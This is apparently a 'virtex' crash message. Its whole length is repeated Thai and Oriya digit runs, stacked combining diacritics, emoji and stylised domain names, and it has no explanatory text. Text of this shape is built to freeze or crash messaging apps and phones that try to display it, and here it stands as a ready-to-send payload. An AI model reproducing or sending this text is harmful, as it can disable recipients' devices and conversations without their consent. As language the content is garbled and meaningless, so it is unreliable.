*๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *_~<[kolaborasi.com]>~_* *⬤ ⃢͓̽⃟͓̽ཷ͓̽ึ͓̽ึ͓̽ึ͓̽ึ͓̽ึ͓̽ึ͓̽ึ͓̽ึ͓̽ึ͓̽ึ͓̽ึ͓̽ึ͓̽ࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧ ⃢͓̽⃟͓̽ཷ͓̽ึ͓̽ึ͓̽ึ͓̽ึ͓̽ึ͓̽ึ͓̽ึ͓̽ึ͓̽ึ͓̽ึ͓̽ึ͓̽ึ͓̽ࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧ*��* ᴠ.➊➋ঔৣ͜͡𓃵⃟🥶࿐⁩ *⚘᭫ː͜͡✿⃝⃟݊ᤢོ۪🇮🇩ོོ͓̽⃟͓̽ཷ͓̽ึ͓̽ึ͓̽ึ͓̽ึ͓̽ึ͓̽ึ͓̽ึ͓̽ึ͓̽ึ͓̽ึ͓̽ึ͓̽ึ͓̽ࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧ ⃢͓̽⃟͓̽ཷ͓̽ึ͓̽ึ͓̽ึ͓̽ึ͓̽ึ͓̽ึ͓̽ึ͓̽ึ͓̽ึ͓̽ึ͓̽ึ͓̽ึ͓̽ࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧ ⃢🌹೩ོ0ོ೩ོ ɩȿạɩɾ.com* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* 